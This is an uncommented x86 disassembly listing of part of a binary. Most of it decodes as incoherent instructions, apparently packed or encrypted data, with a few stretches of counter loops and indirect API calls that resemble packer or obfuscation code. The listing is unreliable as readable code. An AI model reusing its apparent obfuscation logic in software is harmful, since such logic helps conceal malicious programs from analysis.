  4081ec:	sar    BYTE PTR [esi],cl
  4081ee:	cmp    dl,BYTE PTR [ecx+0x69]
  4081f1:	sbb    ecx,esp
  4081f3:	sbb    BYTE PTR [ebx-0x5138e36c],bh
  4081f9:	cmp    ecx,DWORD PTR [esi-0x34]
  4081fc:	je     0x408187
  4081fe:	and    esi,DWORD PTR [eax+0x2]
  408201:	and    DWORD PTR [ebx],0x9e9caa1a
  408207:	xchg   DWORD PTR [edi-0x7e7c0eef],edi
  40820d:	out    dx,eax
  40820e:	mov    esi,0xe1d23df6
  408213:	pop    edx
  408214:	aas    
  408215:	cmp    ah,bl
  408217:	scas   eax,DWORD PTR es:[edi]
  408218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408219:	lds    edi,FWORD PTR [esp+eiz*4+0x54]
  40821d:	in     al,0x82
  40821f:	call   DWORD PTR [ebp-0x14a4410a]
  408225:	cmp    edx,DWORD PTR [edi-0x328eaae8]
  40822b:	mov    al,0xc6
  40822d:	aas    
  40822e:	repz enter 0x1913,0x8
  408233:	pop    ecx
  408234:	fld    DWORD PTR [edx-0x58]
  408237:	and    al,0x64
  408239:	cli    
  40823a:	inc    eax
  40823b:	rcl    BYTE PTR [esi+0x10],cl
  40823e:	inc    eax
  40823f:	arpl   WORD PTR [edi-0x14ed8b20],si
  408245:	sti    
  408246:	fsub   DWORD PTR [edx]
  408248:	dec    edi
  408249:	pop    es
  40824a:	sub    dh,BYTE PTR [eax+0x72]
  40824d:	dec    esi
  40824e:	xlat   BYTE PTR ds:[ebx]
  40824f:	(bad)  
  408250:	stc    
  408251:	test   al,0xd3
  408253:	xchg   ecx,eax
  408254:	jno    0x408284
  408256:	scas   eax,DWORD PTR es:[edi]
  408257:	ins    DWORD PTR es:[edi],dx
  408258:	jmp    0x4081f2
  40825a:	mov    ch,0xda
  40825c:	scas   al,BYTE PTR es:[edi]
  40825d:	shl    BYTE PTR [edi-0x4],0xab
  408261:	cmp    DWORD PTR [edx-0x1e],ebp
  408264:	cld    
  408265:	sahf   
  408266:	jne    0x408259
  408268:	xchg   esp,eax
  408269:	dec    esp
  40826a:	mov    bl,0xf1
  40826c:	inc    esp
  40826d:	mov    BYTE PTR [esi],cl
  40826f:	sub    al,0x51
  408271:	inc    edx
  408272:	xchg   ecx,eax
  408273:	mov    eax,ds:0x8efb67c9
  408278:	into   
  408279:	jmp    ebx
  40827b:	mov    ah,0x36
  40827d:	jne    0x4082be
  40827f:	sbb    esi,DWORD PTR [ecx-0x36c145c4]
  408285:	shr    BYTE PTR [edi],0x9c
  408288:	add    edx,eax
  40828a:	mov    ah,0xdf
  40828c:	mov    ch,0x28
  40828e:	adc    BYTE PTR ds:[eax+0x42eda5a9],ah
  408295:	stos   BYTE PTR es:[edi],al
  408296:	test   al,0x9f
  408298:	shrd   edi,edx,0xdf
  40829c:	ss call 0x14deee5b
  4082a2:	sub    al,0x28
  4082a4:	mov    al,0x38
  4082a6:	pushf  
  4082a7:	mov    ecx,0x9199f846
  4082ac:	in     al,dx
  4082ad:	push   eax
  4082ae:	inc    edx
  4082af:	cli    
  4082b0:	test   BYTE PTR [eax-0x630f6026],bl
  4082b6:	out    dx,al
  4082b7:	jnp    0x408289
  4082b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ba:	enter  0xbea0,0x2
  4082be:	dec    esi
  4082bf:	(bad)  
  4082c0:	or     al,0xf7
  4082c2:	retf   
  4082c3:	scas   eax,DWORD PTR es:[edi]
  4082c4:	mov    ds:0x4651d92e,al
  4082c9:	pop    edx
  4082ca:	(bad)
  4082cd:	or     ah,BYTE PTR [ebx+0x24]
  4082d0:	sub    BYTE PTR [ebx+ecx*1-0x595ec96b],dl
  4082d7:	lds    eax,FWORD PTR [esi+0x79e0d066]
  4082dd:	test   DWORD PTR [ebx+0x7759eea1],ebp
  4082e3:	xor    eax,0xb2c94e49
  4082e8:	imul   ebx,DWORD PTR [ebx-0x67],0xffffffa8
  4082ec:	xor    BYTE PTR [esi-0x13],dh
  4082ef:	xchg   BYTE PTR [esi],dl
  4082f1:	mov    ebx,0xa3de14b7
  4082f6:	jge    0x408334
  4082f8:	jmp    0x253f175
  4082fd:	add    al,0x20
  4082ff:	or     al,0x2a
  408301:	retf   
  408302:	loopne 0x4082fc
  408304:	or     dh,BYTE PTR [eax+edx*4-0x1c]
  408308:	inc    eax
  408309:	fild   QWORD PTR ds:0x6452b89d
  40830f:	add    al,0x2e
  408311:	in     al,0x74
  408313:	sahf   
  408314:	cmp    BYTE PTR [ebp-0x26],dh
  408317:	(bad)  
  408318:	test   DWORD PTR [ebx+0x6b],ebp
  40831b:	xchg   bh,dh
  40831d:	fcmovu st,st(0)
  40831f:	jns    0x4082ab
  408321:	mov    ch,0x65
  408323:	mov    ds:0xb2c08dc6,eax
  408328:	ror    bh,0x52
  40832b:	ds out 0x81,al
  40832e:	adc    eax,0x8f0dd650
  408333:	in     al,dx
  408334:	xchg   esp,eax
  408335:	fdiv   DWORD PTR [ecx+0x31]
  408338:	add    cl,cl
  40833a:	shl    DWORD PTR [ebp-0x5d22fe46],0x66
  408341:	mov    dl,0x41
  408343:	stos   BYTE PTR es:[edi],al
  408344:	popa   
  408345:	sub    BYTE PTR [ecx+0x20],bh
  408348:	dec    edi
  408349:	push   cs
  40834a:	enter  0x82eb,0xd2
  40834e:	repz clc 
  408350:	add    eax,0x33a6ac4a
  408355:	ret    0x323d
  408358:	or     ecx,edx
  40835a:	imul   ecx,DWORD PTR [edi],0xffef7e84
  408360:	dec    DWORD PTR [ebx+0x81f045]
  408366:	add    al,0x35
  408368:	inc    eax
  408369:	pop    es
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4344ef,0x17
  408394:	cmp    DWORD PTR ds:0x4344ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4344ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434553
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4344ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4344ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4344ef,eax
  4083e0:	mov    eax,ds:0x4344ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4344ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434613
  4083f7:	sbb    DWORD PTR ds:0x434503,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434587,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434583
  408413:	sbb    DWORD PTR ds:0x434613,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	mov    ds,WORD PTR [ebx]
  40842d:	jmp    0xe17e:0x7edefbbf
  408434:	js     0x4084b4
  408436:	jle    0x4084a1
  408438:	or     al,0xa3
  40843a:	daa    
  40843b:	add    eax,0xad386139
  408440:	ffree  st(6)
  408442:	jbe    0x40845e
  408444:	cmp    edx,DWORD PTR [edi]
  408446:	inc    esp
  408447:	pop    eax
  408448:	jne    0x408428
  40844a:	je     0x4084a0
  40844c:	call   0xf6b0a69d
  408451:	mov    edi,0xd726fd2b
  408456:	jbe    0x4084bb
  408458:	outs   dx,DWORD PTR ds:[esi]
  408459:	mov    esp,ebp
  40845b:	cld    
  40845c:	lods   eax,DWORD PTR ds:[esi]
  40845d:	sti    
  40845e:	imul   esp,DWORD PTR [edi],0xffffff94
  408461:	sbb    al,0x5e
  408463:	shl    DWORD PTR [eax],1
  408465:	mov    ah,0xbf
  408467:	les    esp,FWORD PTR [eax-0x2c]
  40846a:	jmp    0x6f51:0xd257be9c
  408471:	mov    dl,BYTE PTR [ebx+0x39dfdcaa]
  408477:	nop
  408478:	and    eax,0x9c8153e3
  40847d:	aaa    
  40847e:	nop
  40847f:	retf   
  408480:	loopne 0x408487
  408482:	mov    edi,0x546af319
  408487:	mov    ah,cl
  408489:	int    0xa6
  40848b:	mov    ebp,0xc3812d2c
  408490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408491:	adc    esp,DWORD PTR [ebx]
  408493:	sub    al,0xa0
  408495:	push   esi
  408496:	ret    0x87fe
  408499:	push   esi
  40849a:	cmp    edi,DWORD PTR [edx+ebp*4]
  40849d:	(bad)  
  40849e:	adc    dl,ah
  4084a0:	arpl   WORD PTR [eax],di
  4084a2:	add    eax,0x4d431310
  4084a7:	cdq    
  4084a8:	daa    
  4084a9:	sar    DWORD PTR [ebp+0x5c],1
  4084ac:	fimul  WORD PTR [eax]
  4084ae:	sbb    eax,0xf0a8ecfd
  4084b3:	les    eax,FWORD PTR [eax]
  4084b5:	mov    ebp,DWORD PTR [edx]
  4084b7:	jp     0x4084aa
  4084b9:	jmp    0x40851e
  4084bb:	shl    BYTE PTR [edi+0xe],0xff
  4084bf:	mov    ecx,0x1ae36a8a
  4084c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084c5:	adc    eax,0x51c36032
  4084ca:	dec    eax
  4084cb:	cmp    bh,BYTE PTR [ebx+0x43e2a17]
  4084d1:	hlt    
  4084d2:	scas   eax,DWORD PTR es:[edi]
  4084d3:	das    
  4084d4:	push   cs
  4084d5:	pusha  
  4084d6:	fwait
  4084d7:	mov    fs,WORD PTR [edx-0x749841e7]
  4084dd:	xchg   esi,eax
  4084de:	push   ebx
  4084df:	mov    al,0x25
  4084e1:	leave  
  4084e2:	(bad)  
  4084e3:	call   FWORD PTR ds:0x2d0ded8b
  4084e9:	inc    edi
  4084ea:	mov    cl,0xf6
  4084ec:	or     BYTE PTR ds:0x2762e7f7,dh
  4084f2:	inc    esp
  4084f3:	adc    BYTE PTR [esp+eax*4-0x29],ah
  4084f7:	inc    edx
  4084f8:	add    eax,0xc3336fea
  4084fd:	cmp    ebx,DWORD PTR [ebp+0x7514dc3a]
  408503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408504:	and    DWORD PTR [edx],ecx
  408506:	dec    edi
  408507:	adc    al,0x99
  408509:	dec    ecx
  40850a:	int    0xda
  40850c:	cmp    edx,DWORD PTR [esp+edi*8]
  40850f:	adc    DWORD PTR [ecx],esi
  408511:	push   eax
  408512:	push   es
  408513:	pop    edi
  408514:	inc    ebx
  408515:	add    ch,cl
  408517:	push   edx
  408518:	arpl   WORD PTR [eax],cx
  40851a:	dec    esp
  40851b:	xchg   edx,eax
  40851c:	mov    edi,0xc4f31e76
  408521:	inc    esp
  408522:	sti    
  408523:	pop    eax
  408524:	mov    cl,cl
  408526:	and    ebx,ecx
  408528:	cmp    ecx,edi
  40852a:	stos   DWORD PTR es:[edi],eax
  40852b:	sub    DWORD PTR [esi-0x21],ebp
  40852e:	mov    al,ds:0x1fab83a9
  408533:	mov    ch,0x19
  408535:	lea    esp,[esi+0x3af87e07]
  40853b:	pop    es
  40853c:	xchg   ebx,eax
  40853d:	ret    
  40853e:	mov    esp,0x6e89dc76
  408543:	push   esi
  408544:	enter  0xbb0b,0xd0
  408548:	and    BYTE PTR [ecx],ch
  40854a:	cli    
  40854b:	stos   BYTE PTR es:[edi],al
  40854c:	iret   
  40854d:	test   eax,0x5c56666e
  408552:	xchg   ecx,eax
  408553:	inc    esp
  408554:	mov    ds:0x43f8f3fb,al
  408559:	ss dec edi
  40855b:	inc    esi
  40855c:	dec    ecx
  40855d:	push   es
  40855e:	add    BYTE PTR [edi],al
  408560:	ins    BYTE PTR es:[edi],dx
  408561:	addr16 dec ebx
  408563:	mov    eax,0xe7e72110
  408568:	sbb    edx,DWORD PTR [esi+ecx*8]
  40856b:	xchg   ebx,eax
  40856c:	clc    
  40856d:	sbb    al,0x7d
  40856f:	mov    edi,0x924def2a
  408574:	cdq    
  408575:	or     dh,BYTE PTR [edx-0x416cc3c9]
  40857b:	push   cs
  40857c:	bound  ecx,QWORD PTR [edx]
  40857e:	sbb    DWORD PTR [edi+0x4d],edi
  408581:	popf   
  408582:	sbb    bh,cl
  408584:	mov    bh,0xc2
  408586:	es leave 
  408588:	pop    edi
  408589:	jg     0x4085e3
  40858b:	pushf  
  40858c:	pop    ds
  40858d:	addr16 sbb al,0x1d
  408590:	dec    edx
  408591:	push   ecx
  408592:	arpl   sp,dx
  408594:	stos   BYTE PTR es:[edi],al
  408595:	inc    edi
  408596:	mov    al,ds:0x4bc5144d
  40859b:	arpl   WORD PTR [ecx],cx
  40859d:	mov    dl,0x45
  40859f:	loop   0x408584
  4085a1:	pop    ebx
  4085a2:	push   ebx
  4085a3:	stos   DWORD PTR es:[edi],eax
  4085a4:	lahf   
  4085a5:	jbe    0x408533
  4085a7:	fistp  QWORD PTR [edx]
  4085a9:	sub    ch,BYTE PTR [esi+0x2f086d3a]
  4085af:	xchg   ecx,eax
  4085b0:	dec    eax
  4085b1:	sub    DWORD PTR [ebp-0x2b3cdaa8],0x5a
  4085b8:	lahf   
  4085b9:	cdq    
  4085ba:	jl     0x408603
  4085bc:	mov    eax,0x6a1caca7
  4085c1:	lods   eax,DWORD PTR ds:[esi]
  4085c2:	jge    0x408618
  4085c4:	jns    0x4085e1
  4085c6:	repnz or BYTE PTR [ecx-0x27],ch
  4085ca:	cmp    DWORD PTR [esi+0x657c4b19],ecx
  4085d0:	pop    edx
  4085d1:	mov    ah,BYTE PTR [edx-0x12aae16f]
  4085d7:	xchg   ecx,eax
  4085d8:	inc    ebx
  4085d9:	mov    cl,0xb0
  4085db:	(bad)  
  4085dd:	or     BYTE PTR [ecx],0x64
  4085e0:	hlt    
  4085e1:	lods   eax,DWORD PTR ds:[esi]
  4085e2:	xchg   ebx,eax
  4085e3:	dec    ebx
  4085e4:	or     BYTE PTR [ebx+0x57],ch
  4085e7:	push   ebx
  4085e8:	xor    esi,DWORD PTR [eax+esi*8-0x68d56161]
  4085ef:	leave  
  4085f0:	lahf   
  4085f1:	xor    eax,DWORD PTR [edx+0x4]
  4085f4:	gs call 0x4e70:0xec517f2a
  4085fc:	mov    ds:0x52045a71,al
  408601:	jge    0x4085e4
  408603:	mov    eax,0x9044ca0
  408608:	out    dx,al
  408609:	and    bh,BYTE PTR [edx+0x11ef0d26]
  40860f:	cwde   
  408610:	mov    eax,ds:0x9819e883
  408615:	lds    edx,FWORD PTR [ebp+esi*4+0x104f8e5a]
  40861c:	mov    ah,0x27
  40861e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40861f:	push   0xffffff92
  408621:	mov    eax,0xc4bf233f
  408626:	mov    ch,0xdd
  408628:	pop    eax
  408629:	fdiv   DWORD PTR [edi+ebx*8-0x275ee743]
  408630:	or     DWORD PTR [esi+0x70124860],ebp
  408636:	jo     0x408654
  408638:	lds    edx,FWORD PTR [edx+0x2b]
  40863b:	xor    eax,0x8b7145f3
  408640:	mov    ecx,edx
  408642:	push   ss
  408643:	in     al,0x20
  408645:	mov    bl,0xa3
  408647:	dec    ebp
  408648:	clc    
  408649:	bnd je 0x40864f
  40864c:	ins    BYTE PTR es:[edi],dx
  40864d:	out    0x1b,eax
  40864f:	mov    al,ds:0x53836906
  408654:	add    ah,BYTE PTR [ebx+0x51]
  408657:	sub    ah,ah
  408659:	sar    DWORD PTR [edi-0x743c05db],cl
  40865f:	xchg   cl,al
  408661:	xchg   esp,eax
  408662:	daa    
  408663:	pusha  
  408664:	ror    DWORD PTR [edi+0x2b0edc58],0x1
  40866b:	or     bl,dh
  40866d:	enter  0x9684,0xc0
  408671:	mov    ebp,0x3fd27234
  408676:	xchg   esp,eax
  408677:	jb     0x40862f
  408679:	add    bh,bl
  40867b:	pop    ebp
  40867c:	leave  
  40867d:	adc    eax,0x356be6dd
  408682:	pop    es
  408683:	cld    
  408684:	mov    dl,0xae
  408686:	out    0xde,al
  408688:	mov    al,ds:0xe1b280ef
  40868d:	sbb    esi,0x4b
  408690:	nop
  408691:	pushf  
  408692:	call   0xc0dbe7ee
  408697:	jmp    0x4086b3
  408699:	mov    ebp,0x8863beb9
  40869e:	cs gs loop 0x4086c4
  4086a2:	mov    esi,0x7510851
  4086a7:	and    DWORD PTR ds:0x4344ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4344ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4344ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4344ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4344ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4344ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4344ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4344ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434583
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0xb94a3fc8
  408731:	test   ch,bh
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	mov    eax,ds:0xbcd5a3e3
  408740:	push   edi
  408741:	or     ah,bl
  408743:	push   ss
  408744:	shr    BYTE PTR [edi-0x8],0x4a
  408748:	xchg   ebp,eax
  408749:	sbb    ch,dl
  40874b:	inc    ecx
  40874c:	test   esp,esi
  40874e:	ror    DWORD PTR [edi-0x58de136e],0x32
  408755:	push   ss
  408756:	push   ebx
  408757:	push   0xd248c071
  40875c:	xchg   ebx,eax
  40875d:	mov    WORD PTR [edx],gs
  40875f:	lods   eax,DWORD PTR ds:[esi]
  408760:	inc    esi
  408761:	mov    al,0x7c
  408763:	out    dx,eax
  408764:	aam    0x96
  408766:	sar    BYTE PTR [esi-0x7ff56c0b],0x9e
  40876d:	sub    edx,edi
  40876f:	outs   dx,BYTE PTR ds:[esi]
  408770:	ror    DWORD PTR [edx-0x3e06f4ef],0x89
  408777:	push   ebx
  408778:	mov    ah,BYTE PTR [esi+0x57]
  40877b:	mov    edx,0x31c192f5
  408780:	pop    esi
  408781:	in     eax,dx
  408782:	adc    edi,esi
  408784:	cli    
  408785:	mov    esi,DWORD PTR [esi+0x24]
  408788:	dec    eax
  408789:	clc    
  40878a:	push   edi
  40878b:	mov    al,ds:0x4c1717c
  408790:	cdq    
  408791:	mov    al,0x5
  408793:	jmp    FWORD PTR [ebp+0x14]
  408796:	cmp    ah,BYTE PTR ds:0xa022fa55
  40879c:	stc    
  40879d:	and    eax,0xda8c910d
  4087a2:	push   ds
  4087a3:	repnz sbb eax,0x39c4bbc6
  4087a9:	lods   eax,DWORD PTR ds:[esi]
  4087aa:	arpl   WORD PTR fs:[esi+0x41],dx
  4087ae:	cld    
  4087af:	call   0x3103:0x614ab204
  4087b6:	jp     0x4087ec
  4087b8:	sub    al,0x41
  4087ba:	lahf   
  4087bb:	int3   
  4087bc:	rol    BYTE PTR [ecx*2+0x683f7aa1],1
  4087c3:	test   eax,0xb33a9842
  4087c8:	test   eax,0xc8c3b37e
  4087cd:	jae    0x4087d2
  4087cf:	sahf   
  4087d0:	scas   al,BYTE PTR es:[edi]
  4087d1:	jb     0x408842
  4087d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087d4:	mov    ds:0x791b3e4c,al
  4087d9:	mov    ebp,0x6b1542b4
  4087de:	mov    ah,0x37
  4087e0:	js     0x4087e6
  4087e2:	or     BYTE PTR [ecx],bh
  4087e4:	and    al,0x8a
  4087e6:	inc    ebp
  4087e7:	adc    bh,BYTE PTR [ecx+edx*4-0x50af53f3]
  4087ee:	test   dh,bh
  4087f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f1:	cmp    al,0x87
  4087f3:	das    
  4087f4:	xlat   BYTE PTR ds:[ebx]
  4087f5:	arpl   WORD PTR [ebp+ebx*4+0x43bbb32b],si
  4087fc:	ret    
  4087fd:	cmp    BYTE PTR [edx-0x3f],bl
  408800:	inc    eax
  408801:	clc    
  408802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408803:	scas   eax,DWORD PTR es:[edi]
  408804:	push   0x5e
  408806:	or     al,BYTE PTR [ebx-0x541e484b]
  40880c:	mov    dh,0x4
  40880e:	xor    BYTE PTR [ecx+0x9],cl
  408811:	mov    bh,cl
  408813:	cdq    
  408814:	sub    dl,BYTE PTR [edx-0x54467a08]
  40881a:	mov    ds:0xa4ca9ba8,al
  40881f:	retf   0xaf67
  408822:	out    dx,eax
  408823:	dec    eax
  408824:	pop    ebx
  408825:	enter  0x5217,0xf9
  408829:	sbb    BYTE PTR [esi-0x3d],cl
  40882c:	sti    
  40882d:	not    BYTE PTR [eax-0x3ada03d1]
  408833:	xor    al,0xc6
  408835:	sar    BYTE PTR [ecx+0x1595a0a2],cl
  40883b:	mov    ebp,0x76c7062a
  408840:	loope  0x408875
  408842:	out    0xe,al
  408844:	sahf   
  408845:	jnp    0x408844
  408847:	cmp    eax,0xd91fe461
  40884c:	(bad)  
  40884d:	mov    edi,0xdf5f94b6
  408852:	inc    esi
  408853:	xor    eax,0x9a0f904
  408858:	das    
  408859:	or     al,0x2c
  40885b:	inc    esp
  40885c:	push   esi
  40885d:	sbb    BYTE PTR [edi-0x6187b8a6],0x90
  408864:	dec    ebp
  408865:	xor    bh,BYTE PTR [edi+0x26]
  408868:	push   esp
  408869:	add    DWORD PTR [edx-0xe],edx
  40886c:	lock mov fs,esp
  40886f:	cmp    eax,0x853ac210
  408874:	es add esp,ebp
  408877:	shl    BYTE PTR [esi-0x7300b23c],cl
  40887d:	and    ch,BYTE PTR [edx]
  40887f:	mov    ecx,0x1f98bf25
  408884:	fisub  DWORD PTR [eax+0x5f]
  408887:	por    mm3,mm3
  40888a:	inc    BYTE PTR [ecx]
  40888c:	jne    0x408856
  40888e:	popa   
  40888f:	mov    ah,0xa8
  408891:	dec    ebp
  408892:	scas   eax,DWORD PTR es:[edi]
  408893:	clc    
  408894:	fst    DWORD PTR [ebx+0x72503f39]
  40889a:	dec    ebx
  40889b:	cmp    ecx,DWORD PTR ds:[esi-0x1c02f4fb]
  4088a2:	cmc    
  4088a3:	xchg   ebp,eax
  4088a4:	lods   eax,DWORD PTR ds:[esi]
  4088a5:	mov    dl,0x1a
  4088a7:	shr    DWORD PTR [ebx+0x2e40b1f5],1
  4088ad:	and    eax,0x17b9e8c5
  4088b2:	lahf   
  4088b3:	mov    es,WORD PTR [ebx]
  4088b5:	or     BYTE PTR [eax-0x34],0xac
  4088b9:	pushf  
  4088ba:	ret    
  4088bb:	sbb    bh,BYTE PTR [ecx+0x41d6129e]
  4088c1:	dec    ebp
  4088c2:	xor    bh,BYTE PTR [edi]
  4088c4:	xor    cl,ch
  4088c6:	(bad)  
  4088c7:	leave  
  4088c8:	push   ebp
  4088c9:	fimul  WORD PTR [ecx-0x5ef1c763]
  4088cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d0:	iret   
  4088d1:	jae    0x4088ff
  4088d3:	pop    ds
  4088d4:	mov    dh,0x48
  4088d6:	xchg   edi,eax
  4088d7:	pop    DWORD PTR [esi-0x18a73b27]
  4088dd:	out    0x8f,eax
  4088df:	jno    0x408919
  4088e1:	mov    ds:0xb18afb45,al
  4088e6:	popa   
  4088e7:	cmc    
  4088e8:	not    BYTE PTR [ebp+0x18]
  4088eb:	mov    ds,WORD PTR [edi-0x1d29d3c8]
  4088f1:	sub    DWORD PTR [eax-0x34940460],esp
  4088f7:	stos   DWORD PTR es:[edi],eax
  4088f8:	or     bl,dh
  4088fa:	(bad)  
  4088fb:	call   0x8402ad28
  408900:	out    dx,eax
  408901:	xchg   edi,eax
  408902:	pushf  
  408903:	sbb    bl,BYTE PTR [edi+0x54]
  408906:	in     al,dx
  408907:	sahf   
  408908:	add    DWORD PTR [edi-0x44],ebp
  40890b:	inc    edi
  40890c:	jo     0x40892e
  40890e:	loope  0x408956
  408910:	sub    al,0x23
  408912:	int3   
  408913:	fcomp  st(7)
  408915:	jp     0x408963
  408917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408918:	or     al,0x4a
  40891a:	inc    ecx
  40891b:	sbb    bl,BYTE PTR [edi+0x466cf604]
  408921:	ret    0xce
  408924:	arpl   cx,bp
  408926:	(bad)  
  408928:	mov    eax,0x2337ea00
  40892d:	je     0x408951
  40892f:	pop    ebx
  408930:	jecxz  0x40894b
  408932:	mov    edi,0xa5adc876
  408937:	sbb    BYTE PTR [edx-0x88e9bb0],bl
  40893d:	jmp    0x1dc77ef2
  408942:	mov    BYTE PTR [edi-0x5d],bl
  408945:	xchg   dh,bh
  408947:	popa   
  408948:	sub    BYTE PTR [ecx],ch
  40894a:	xor    BYTE PTR [edi+0x7c],0x68
  40894e:	adc    eax,0xbe605b9b
  408953:	cli    
  408954:	sar    DWORD PTR [ecx-0x6fddebff],0xf4
  40895b:	mov    al,dh
  40895d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40895e:	retf   0x194a
  408961:	and    eax,esi
  408963:	je     0x4088f8
  408965:	ins    DWORD PTR es:[edi],dx
  408966:	test   ch,dh
  408968:	jns    0x408962
  40896a:	ror    ecx,cl
  40896c:	xor    ecx,esi
  40896e:	jg     0x4088f1
  408970:	call   0xede8:0xd47fb175
  408977:	ins    DWORD PTR es:[edi],dx
  408978:	ret    0x7f42
  40897b:	inc    esp
  40897c:	popa   
  40897d:	or     eax,0x709872cf
  408982:	pop    ds
  408983:	cdq    
  408984:	enter  0x5017,0xa0
  408988:	std    
  408989:	pop    eax
  40898a:	mov    eax,ds:0x8ef51cda
  40898f:	and    al,0x1f
  408991:	mov    eax,ebx
  408993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408995:	sbb    eax,0x8318d4d6
  40899a:	push   ebp
  40899b:	mov    WORD PTR ds:0x2061cc4d,fs
  4089a1:	sbb    bh,BYTE PTR [edx-0x74757d6b]
  4089a7:	jge    0x4089b1
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x4344eb
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	push   edi
  4089db:	sar    BYTE PTR [edi-0x27],0xd1
  4089df:	fstp   TBYTE PTR [esi+0x7e]
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	call   FWORD PTR [ebp+0x2b]
  4089e9:	imul   eax,ebx,0xffffff98
  4089ec:	sub    esi,DWORD PTR [edi+edi*8+0x20757d2b]
  4089f3:	sub    ah,bl
  4089f5:	loopne 0x408a10
  4089f7:	ret    0xaa2f
  4089fa:	test   DWORD PTR [edi],edx
  4089fc:	cmp    DWORD PTR [edi-0x69db7954],esp
  408a02:	inc    ebx
  408a03:	jbe    0x4089b4
  408a05:	push   ss
  408a06:	or     edi,esp
  408a08:	xor    eax,0x83d36619
  408a0d:	outs   dx,DWORD PTR ds:[esi]
  408a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a0f:	fsubp  st(7),st
  408a11:	jecxz  0x4089ec
  408a13:	push   0xf67c7d09
  408a18:	mov    edx,0xe14fdec4
  408a1d:	and    DWORD PTR ss:0x9bf6de57,edx
  408a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a25:	rcr    DWORD PTR [ebx],0x30
  408a28:	loope  0x4089f0
  408a2a:	jmpw   0x1828
  408a2e:	setb   BYTE PTR [esi-0x29]
  408a32:	ret    0x1671
  408a35:	mov    WORD PTR [esi+0x17e8bfc6],ds
  408a3b:	pop    edx
  408a3c:	cmp    al,ch
  408a3e:	jne    0x408a7d
  408a40:	or     DWORD PTR [ebx],esi
  408a42:	push   edi
  408a43:	xchg   DWORD PTR [edi-0x1eee475a],eax
  408a49:	mov    dl,0x44
  408a4b:	inc    esp
  408a4c:	mov    WORD PTR [esi-0x39],?
  408a4f:	pop    eax
  408a50:	xlat   BYTE PTR ds:[ebx]
  408a51:	das    
  408a52:	fidivr WORD PTR [eax+0x1f]
  408a55:	xor    eax,0x48b628dc
  408a5a:	pop    ebp
